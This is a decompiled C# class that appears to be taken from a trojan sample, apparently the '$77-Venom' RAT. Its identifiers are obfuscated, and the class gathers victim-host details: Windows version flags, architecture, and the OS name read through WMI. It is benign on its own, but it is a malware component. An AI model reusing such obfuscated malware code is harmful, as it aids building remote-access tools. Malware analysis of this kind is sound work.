// Decompiled with JetBrains decompiler
// Type: ఌ୲Ŧ횀˓쀋쌅ِ˙䀘䩕䵭곳ꨕ黝刎䊦谩藰陕
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Management;
using System.Text.RegularExpressions;

public static class ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕
{
  static ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕()
  {
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.XpOrHigher = ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Win32NT && Environment.OSVersion.Version.Major >= 5;
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.VistaOrHigher = ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Win32NT && Environment.OSVersion.Version.Major >= 6;
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.SevenOrHigher = ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Win32NT && Environment.OSVersion.Version >= new Version(6, 1);
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.EightOrHigher = ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Win32NT && Environment.OSVersion.Version >= new Version(6, 2, 9200);
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.EightPointOneOrHigher = ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Win32NT && Environment.OSVersion.Version >= new Version(6, 3);
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.TenOrHigher = ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Win32NT && Environment.OSVersion.Version >= new Version(10, 0);
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.RunningOnMono = Type.GetType("Mono.Runtime") != (Type) null;
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Name = "Unknown OS";
    using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
    {
      using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
      {
        if (enumerator.MoveNext())
          ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Name = enumerator.Current["Caption"].ToString();
      }
    }
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Name = Regex.Replace(ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Name, "^.*(?=Windows)", "").TrimEnd().TrimStart();
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Is64Bit = Environment.Is64BitOperatingSystem;
    ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.FullName = string.Format("{0} {1} Bit", (object) ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Name, (object) (ఌ\u0B72Ŧ횀\u02D3쀋쌅ِ\u02D9䀘䩕䵭곳ꨕ黝刎䊦谩藰陕.Is64Bit ? 64 : 32));
  }

  public static string FullName { get; private set; }

  public static string Name { get; private set; }

  public static bool Is64Bit { get; private set; }

  public static bool RunningOnMono { get; private set; }

  public static bool Win32NT { get; private set; }

  public static bool XpOrHigher { get; private set; }

  public static bool VistaOrHigher { get; private set; }

  public static bool SevenOrHigher { get; private set; }

  public static bool EightOrHigher { get; private set; }

  public static bool EightPointOneOrHigher { get; private set; }

  public static bool TenOrHigher { get; private set; }
}
